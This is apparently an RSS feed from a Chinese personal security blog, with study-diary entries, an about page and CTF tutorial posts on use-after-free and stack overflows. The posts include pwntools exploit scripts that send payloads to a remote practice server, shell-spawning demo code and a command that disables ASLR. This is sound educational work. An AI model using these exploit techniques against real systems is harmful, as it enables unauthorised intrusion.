&lt;li&gt;晚上依然看书，ARM的知识好复杂。。。脑壳好疼，，感觉最近记忆力又下降了，刚学的许多知识都记不住。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-13&#34;&gt;2018-08-13&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上打算早起的，然而，又是稍微睡多了一点。。&lt;/li&gt;
&lt;li&gt;下午看一个下午的看雪CTF题目，懂了一些如何识别花指令以及如何去花的知识，小小的收获。&lt;/li&gt;
&lt;li&gt;晚上本来打算看书的，又忍不住看剧 -《沙海》毁原著系列，不过高中看的原著现在也忘记得差不多了，书也就只看了一丢丢。。现在（第二天中午）回想完全忘记看了啥了。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-12&#34;&gt;2018-08-12&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午又睡过头了，哎到底要怎样才能改掉这个习惯。。。&lt;/li&gt;
&lt;li&gt;下午还是看CTF的题。。一个下午过去了，还是自己太菜，那么简单的题都不会。。&lt;/li&gt;
&lt;li&gt;晚上看剧不知不觉又熬夜了，怎么管不住自己呢。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-11&#34;&gt;2018-08-11&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午睡过头了，可能是因为室友走了，早上没人关空调，闹钟响了秒关。起床已经11点了。之后弄了下宽带，假期没人交钱，所以只好偷偷桥接隔壁的WIFi了（反正他们也只有一个人）。&lt;/li&gt;
&lt;li&gt;下午开工。。打算看一些Native层的练习（1点做的打算）。。&lt;/li&gt;
&lt;li&gt;一个下午看了一道CTF题，算是挺难的吧。全是Native层的内容。。&lt;/li&gt;
&lt;li&gt;大晚上的看了一下《漏洞战争。。》&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-10&#34;&gt;2018-08-10&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;迷茫的过了一上午，完全不知道干了啥。&lt;/li&gt;
&lt;li&gt;下午暴雨，学了一个下午的ARM，指令有点多，记的脑壳疼。。，晚饭也没吃，eee。&lt;/li&gt;
&lt;li&gt;剩下的唯一室友走，一个人还是有点无聊，看剧吧，回到宿舍还真是无法学习。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-09&#34;&gt;2018-08-09&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午到实验室发现断网。。。当然断网也无法阻止我学习。。继续调&lt;/li&gt;
&lt;li&gt;发现挺多ARM汇编忘记，拿出书开始肛。有点晕，睡了一觉，醒来出去了一趟。。&lt;/li&gt;
&lt;li&gt;晚上继续肛ARM知识。。。第一次收到安全客的稿费还是挺高兴的（虽然被拒了几篇。o(╥﹏╥)o）&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-08&#34;&gt;2018-08-08&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午继续调昨天剩下的内容，发现IDA7.0失败，试了试6.8 还是失败，不过没像7那样报错，下午继续实施吧。。&lt;/li&gt;
&lt;li&gt;下午3点出发去医院那检验报告。。。&lt;/li&gt;
&lt;li&gt;幸好没啥问题。。出来又是下雨。。先吃药，开学去做个牵引。。&lt;/li&gt;
&lt;li&gt;晚上继续调。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-07&#34;&gt;2018-08-07&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午看了一个上午ARM汇编。&lt;/li&gt;
&lt;li&gt;下午试了动态调试Android，做了下题，发现ARM汇编忘记得差不多了，补补。。。。。&lt;/li&gt;
&lt;li&gt;5点出发去医院做检查，排了很久很久。。。出来下雨又累又饿┭┮﹏┭┮。&lt;/li&gt;
&lt;li&gt;晚上有事看剧过去了。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-06&#34;&gt;2018-08-06&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天有个计划。之后把每天分成三个阶段：&lt;/li&gt;
&lt;li&gt;早上：更新计划，看博客，学习linux相关内容。&lt;/li&gt;
&lt;li&gt;下午：看Android相关内容。&lt;/li&gt;
&lt;li&gt;晚上：看剧以及看实体书。&lt;/li&gt;
&lt;li&gt;困了，打游戏可以稍作缓解（一局吃鸡或者王者）又或者出去散散步。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-05&#34;&gt;2018-08-05&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;星期天（每天都是），早上9点起的，看了一些逆向工具的使用。补了一些漏。。&lt;/li&gt;
&lt;li&gt;下午有点迷，天气有点热，还是在看逆向知识。&lt;/li&gt;
&lt;li&gt;晚上一不小心看完了《夏日大作战》。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-03&#34;&gt;2018-08-03&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;晚上看了几篇CVE，迷茫，看不懂，还是去看更基础的吧。。。&lt;/li&gt;
&lt;li&gt;去了校医院，转到了中医药大学附属医院去看。排了一个早上一号，医生直接没来（医生不来为甚要给我成功排号）。&lt;/li&gt;
&lt;li&gt;下午重新排了骨科。开了药以及排了核磁共振号，下周二去拍片（好贵好贵）。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-01&#34;&gt;2018-08-01&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;都到8月了，好像还在迷茫中。。。。&lt;/li&gt;
&lt;li&gt;看完了这篇文章：&lt;a href=&#34;https://azeria-labs.com/the-importance-of-deep-work-the-30-hour-method-for-learning-a-new-skill/&#34;&gt;https://azeria-labs.com/the-importance-of-deep-work-the-30-hour-method-for-learning-a-new-skill/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;如何高效集中式的学习。&lt;/li&gt;
&lt;li&gt;好好开始写日记了。不管多少字。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-07-30&#34;&gt;2018-07-30&lt;/h3&gt;

&lt;p&gt;昨天省赛第二天，AWD线下，3个PWN一个WEB，死磕WEB，在最后10分钟拿了分。&lt;/p&gt;

&lt;p&gt;总结下来还是自己太菜，没办法。。多练练吧。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-28&#34;&gt;2018-07-28&lt;/h3&gt;

&lt;p&gt;省赛，没以前那么水了，7个re中有5个Android,做不出来，对自己失去了希望。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-24&#34;&gt;2018-07-24&lt;/h3&gt;

&lt;p&gt;做CTF,菜的一笔，对人生失去了信心。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-22-23&#34;&gt;2018-07-22-23&lt;/h3&gt;

&lt;p&gt;去校医院看病，转到人民医院去了，花了一个下午，就开了一副药，估计也没什么用。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-18-21&#34;&gt;2018-07-18-21&lt;/h3&gt;

&lt;p&gt;看B站。。。。  补了少许CVE的知识。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-19&#34;&gt;2018-07-19&lt;/h3&gt;

&lt;p&gt;时间都花在看B站上去了。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-15&#34;&gt;2018-07-15&lt;/h3&gt;

&lt;p&gt;太菜，迷茫中。。。。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-12&#34;&gt;2018-07-12&lt;/h3&gt;

&lt;p&gt;列一个假期计划吧，第一：早上尽量早起，不要睡懒觉。第二：争取在这个假期学完linux基础的许多内容，再多练习练习写脚本的技术。补补密码学的知识。第三：加强Android逆向，补一些漏洞的知识（靠翻译和看别人的CVE）。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-10&#34;&gt;2018-07-10&lt;/h3&gt;

&lt;p&gt;假期都过去一周了，好迷茫呀，都不知道做了些什么。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-03-09&#34;&gt;2018-07-03&amp;ndash;09&lt;/h3&gt;

&lt;p&gt;放假了，先迷茫（放松）几天。。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-02&#34;&gt;2018-07-02&lt;/h3&gt;

&lt;p&gt;还是有点受不了原来的主题，Bug有点多，重新换了一个，先立个flag，再也不换主题，就一直修修补补吧。&lt;br /&gt;
  不过golang是真的快呀。&lt;/p&gt;

&lt;h3 id=&#34;2018-06-25-07-01&#34;&gt;2018-06-25&amp;ndash;07-01&lt;/h3&gt;

&lt;p&gt;期末复习ing&lt;/p&gt;

&lt;h3 id=&#34;2018-06-24&#34;&gt;2018-06-24&lt;/h3&gt;

&lt;p&gt;重新开通了博客，基于golang的hugo框架，随便套了个主题，也懒得该些什么，将就用吧。&lt;/p&gt;

&lt;h3 id=&#34;彩蛋&#34;&gt;彩蛋&lt;/h3&gt;

&lt;p&gt;彩蛋就是。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180809205115.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>关于</title>
      <link>https://naivete.cc/about/</link>
      <pubDate>Sun, 24 Jun 2018 21:38:52 +0800</pubDate>
      
      <guid>https://naivete.cc/about/</guid>
      
        <description>

&lt;p&gt;&lt;center&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/tx.jpg&#34; width=&#34;200&#34; height=&#34;200&#34; &gt;&lt;/p&gt;

&lt;p&gt;一个正在学Android安全的菜鸡&lt;/p&gt;

&lt;p&gt;正在努力变强 充电中  &amp;mdash;&lt;br /&gt;
 &lt;!-- [学习日记](https://naivete.cc/学习日记/)  --&gt;
 &lt;!-- [CTF题目汇总](https://naivete.cc/ctf/)   --&gt;&lt;/p&gt;

&lt;h2 id=&#34;hahahugoshortcode-0xc00021a000-1-hbhb&#34;&gt;  &lt;iframe style=&#34;max-width: 100%&#34;
      class=&#34;music163&#34;
      frameborder=&#34;no&#34;
      border=&#34;0&#34;
      marginwidth=&#34;0&#34;
      marginheight=&#34;0&#34;
      width=&#34;330&#34;
      height=&#34;86&#34;
      src=&#34;//music.163.com/outchain/player?type=2&amp;id=496869422&amp;auto=0&amp;height=66&#34;&gt;
    &lt;/iframe&gt;&lt;/h2&gt;

&lt;p&gt;&lt;i class=&#34;fab fa-qq&#34;&gt;&lt;/i&gt;  &lt;strong&gt;QQ&lt;/strong&gt; :  974032325&lt;/p&gt;

&lt;p&gt;&lt;i class=&#34;fab fa-weixin&#34;&gt;&lt;/i&gt;  &lt;strong&gt;个人微信-公众号&lt;/strong&gt;：&lt;br /&gt;
 &lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/MyWeChat.png&#34; alt=&#34;微信&#34; width=&#34;190&#34; height=&#34;190&#34; /&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/myandroidsec.jpg&#34; alt=&#34;微信&#34; width=&#34;190&#34; height=&#34;190&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;/center&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>漏洞基础之3UAF</title>
      <link>https://naivete.cc/post/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</link>
      <pubDate>Wed, 20 Mar 2019 15:37:13 +0800</pubDate>
      
      <guid>https://naivete.cc/post/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</guid>
      
        <description>&lt;ul&gt;
&lt;li&gt;重写ing&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x00原理&#34;&gt;0x00原理&lt;/h3&gt;

&lt;p&gt;堆内存在释放后被直接再次使用(释放了堆块之后，未将该指针值为NULL,导致指针处于悬空状态，被释放的内存能被恶意利用) 在浏览器中比较常见的漏洞&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;根本原因是：&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;

&lt;h5 id=&#34;简单利用&#34;&gt;简单利用&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
typedef void (*func_ptr)(char *);
void evil_fuc(char command[])
{
system(command);
}
void echo(char content[])
{
printf(&amp;quot;%s&amp;quot;,content);
}
int main()
{
    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p1);
    p1[3]=echo;
    p1[3](&amp;quot;hello world\n&amp;quot;);
    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
    p1[3](&amp;quot;hello again\n&amp;quot;); //p1指针未被置空,虽然free了,但仍可使用.
    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p2);
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p1);//p2与p1指针指向的内存为同一地址
    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
    p1[3](&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180912215411.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;pwnable-kr-uaf&#34;&gt;pwnable.kr uaf&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180912220453.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;先看看源码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
using namespace std;

class Human{
private:
    virtual void give_shell(){
        system(&amp;quot;/bin/sh&amp;quot;);
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout &amp;lt;&amp;lt; &amp;quot;My name is &amp;quot; &amp;lt;&amp;lt; name &amp;lt;&amp;lt; endl;
        cout &amp;lt;&amp;lt; &amp;quot;I am &amp;quot; &amp;lt;&amp;lt; age &amp;lt;&amp;lt; &amp;quot; years old&amp;quot; &amp;lt;&amp;lt; endl;
    }
};

class Man: public Human{
public:
    Man(string name, int age){
        this-&amp;gt;name = name;
        this-&amp;gt;age = age;
        }
        virtual void introduce(){
        Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a nice guy!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&amp;gt;name = name;
                this-&amp;gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a cute girl!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

int main(int argc, char* argv[]){
    Human* m = new Man(&amp;quot;Jack&amp;quot;, 25);
    Human* w = new Woman(&amp;quot;Jill&amp;quot;, 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout &amp;lt;&amp;lt; &amp;quot;1. use\n2. after\n3. free\n&amp;quot;;
        cin &amp;gt;&amp;gt; op;

        switch(op){
            case 1:
                m-&amp;gt;introduce();
                w-&amp;gt;introduce();
                break;
            case 2:
                len = atoi(argv[1]);
                data = new char[len];
                read(open(argv[2], O_RDONLY), data, len);
                cout &amp;lt;&amp;lt; &amp;quot;your data is allocated&amp;quot; &amp;lt;&amp;lt; endl;
                break;
            case 3:
                delete m;
                delete w;
                break;
            default:
                break;
        }
    }

    return 0;    
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;hcft2016-fheap&#34;&gt;HCFt2016 fheap&lt;/h5&gt;

&lt;h5 id=&#34;网鼎杯ctf2018-第一场-pwn-babyheap&#34;&gt;网鼎杯CTF2018 第一场 Pwn Babyheap&lt;/h5&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/Ox9A82/p/5320857.html&#34;&gt;https://www.cnblogs.com/Ox9A82/p/5320857.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/alert123/p/4918041.html&#34;&gt;https://www.cnblogs.com/alert123/p/4918041.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/qq_31481187/article/details/73612451&#34;&gt;https://blog.csdn.net/qq_31481187/article/details/73612451&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85281&#34;&gt;https://www.anquanke.com/post/id/85281&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4&#34;&gt;https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85281&#34;&gt;https://www.anquanke.com/post/id/85281&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
      
    </item>
    
    <item>
      <title>ROP练习</title>
      <link>https://naivete.cc/post/rop%E7%BB%83%E4%B9%A0/</link>
      <pubDate>Thu, 28 Feb 2019 00:22:36 +0800</pubDate>
      
      <guid>https://naivete.cc/post/rop%E7%BB%83%E4%B9%A0/</guid>
      
        <description>

&lt;h3 id=&#34;题目列表&#34;&gt;题目列表：&lt;/h3&gt;

&lt;h4 id=&#34;ip-47-106-212-155&#34;&gt;IP:&lt;code&gt;47.106.212.155&lt;/code&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;ret2libc3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10008&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ret2shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10002&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ret2libc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10005&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;train.cs.nctu.edu.tw: rop&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;2013-PlaidCTF-ropasaurusrex&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Defcon 2015 Qualifier: R0pbaby&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10012&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;train.cs.nctu.edu.tw: ret2libc&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;AliCTF 2016：vss&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;RCTF2015-welpwn&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10010&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;lctf16-pwn100&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10011&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;xdctf15-pwn200&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10013&lt;/p&gt;

&lt;p&gt;WP（持续更新）：&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>CTF PWN刷题记录 CTFWiki_1栈溢出</title>
      <link>https://naivete.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
      <pubDate>Wed, 20 Feb 2019 00:17:21 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
      
        <description>

&lt;hr /&gt;

&lt;blockquote&gt;
&lt;p&gt;看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;知识点：[PWN相关知识点总结]()&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Linux PWN&lt;/li&gt;
&lt;li&gt;ARM PWN&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;题目全部来源于 &lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/readme/&#34;&gt;CTFWiki&lt;/a&gt; 上所涉及题目&lt;/p&gt;

&lt;h2 id=&#34;linux-pwn&#34;&gt;Linux PWN&lt;/h2&gt;

&lt;p&gt;大部分原理参考&lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/readme/&#34;&gt;CTFWiki&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;栈溢出&#34;&gt;栈溢出&lt;/h4&gt;

&lt;h5 id=&#34;基本栈溢出&#34;&gt;基本栈溢出&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
void success() { puts(&amp;quot;You Hava already controlled it.&amp;quot;); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
stack1.c: In function ‘vulnerable’:
stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(s);
   ^~~~
   fgets
/tmp/ccNeCYTO.o: In function `vulnerable&#39;:
stack1.c:(.text+0x45): warning: the `gets&#39; function is dangerous and should not be used.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;关闭完全部保护&lt;/p&gt;

&lt;p&gt;步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&amp;gt;+ebp的长度-&amp;gt;+返回的地址（success()的地址)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406211946.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406212108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;poc1.py&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding=utf-8

from pwn import *

# sh = process(&amp;quot;./stack1&amp;quot;)
sh = remote(&amp;quot;47.106.212.155&amp;quot;,10000)
success_addr = 0x08048456

payload = &#39;a&#39;*0x14 + &#39;bbbb&#39; + p32(success_addr)
sh.sendline(payload)
sh.interactive()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406212343.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h5 id=&#34;基本rop&#34;&gt;基本ROP&lt;/h5&gt;

&lt;p&gt;ROP 攻击一般得满足如下条件&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;程序存在溢出，并且可以控制返回地址。&lt;/li&gt;
&lt;li&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&#34;ret2text&#34;&gt;ret2text&lt;/h6&gt;

&lt;p&gt;ret2text 即控制程序执行程序本身已有的的代码 (.text)。&lt;/p&gt;

&lt;p&gt;示例程序：&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text&#34;&gt;ret2text&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406214601.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412180957.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406220340.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;所以只需ret到&lt;code&gt;0x0804863a&lt;/code&gt;就能getshell&lt;/p&gt;

&lt;p&gt;构造payload&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;计算偏移量&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用ragg2&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;ragg2 -P 200 -r &amp;gt; pattern.txt&lt;/code&gt;   or &lt;code&gt;ragg2 -P 200 -r&lt;/code&gt;复制下来&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;   # ragg2 -P 200 -r
  AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;profile.rr2:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  #!/usr/bin/rarun2
  stdin=./pattern.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;r2 -R profile.rr2 -d ret2text&lt;/code&gt; or 直接&lt;code&gt;r2 -d ret2text&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;dc&lt;/code&gt;后输入复制的pattern字符串&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wopO eip&lt;/code&gt;得到偏移&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406231721.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;gdb手动计算&lt;/p&gt;

&lt;p&gt;下断点call处：&lt;code&gt;0x080486ae&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406233003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406233035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412181030.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;所以偏移为108+4&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;python pattern.py&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;payload&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  from pwn import *
  
  # sh = process(./ret2text)
  sh = remote(&amp;quot;47.106.212.155&amp;quot;,10001)
  binsh = 0x0804863a
  payload = 112*&#39;A&#39; + p32(binsh)
  sh.sendline(payload)
  sh.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412181108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h6 id=&#34;ret2shellcode&#34;&gt;ret2shellcode&lt;/h6&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&#34;&gt;ret2shellcode&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;运行时shellcode所在区域应具有可执行权限&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407123948.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407132349.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。&lt;/p&gt;

&lt;p&gt;调试看所在.bss段是否有执行的权限。&lt;/p&gt;

